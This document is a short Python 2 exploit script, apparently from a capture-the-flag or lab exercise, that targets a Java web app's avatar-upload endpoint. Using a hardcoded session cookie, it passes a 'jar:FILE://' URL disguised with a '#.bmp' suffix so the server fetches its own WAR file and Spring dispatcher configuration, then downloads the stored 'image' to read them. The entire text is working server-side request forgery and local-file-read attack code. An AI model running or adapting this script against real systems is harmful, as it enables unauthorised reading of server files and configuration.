import requests, logging, time

HOST="http://192.168.201.25"
# HOST="http://report.wpad.tk"
urllib3_logger = logging.getLogger('urllib3')
urllib3_logger.setLevel(logging.DEBUG)

headers = {"Cookie": "JSESSIONID=node0yxhbtybwad4n1jg1d6notyral433.node0", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36', 'Referer': 'http://localhost:8088/user/', 'X-Requested-With': 'XMLHttpRequest', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}

def get_inner_str(haystack, st, ed):
	haystack = haystack[haystack.index(st)+len(st):]
	haystack = haystack[:haystack.index(ed)]
	return haystack

def check_resp(r):
	global resp
	resp = r
	img_name = get_inner_str(resp.text, '<td align="center"><img src="', '" width')
	res = img_name != '/headimg/default.jpg'
	if res:
		print requests.get(HOST+img_name, headers=headers).content
	return res
	
def check_headimg(url):
	a = requests.get(HOST+'/user/', headers=headers, timeout=4)
	print str(a)
	while True:
		try:
			print 'Step 1'
			print url
			a = requests.get(HOST+'/user/headimg.do', params={'url': url}, headers=headers, timeout=4)
			print str(a)
			if a.status_code == 404:
				break
			time.sleep(1)
		except Exception, e:
			print str(e)
		
	while True:
		try:
			print 'Step 2'
			a = requests.get(HOST+'/user/', headers=headers, timeout=4)
			break
		except:
			pass
			
	return check_resp(a)
	

check_headimg('''jar:FILE:///opt/jetty/webapps/ROOT.war!/WEB-INF/mvc-dispatcher-servlet.xml#.bmp''')
# check_headimg('''file:///opt/jetty/webapps/ROOT.war#.bmp''')


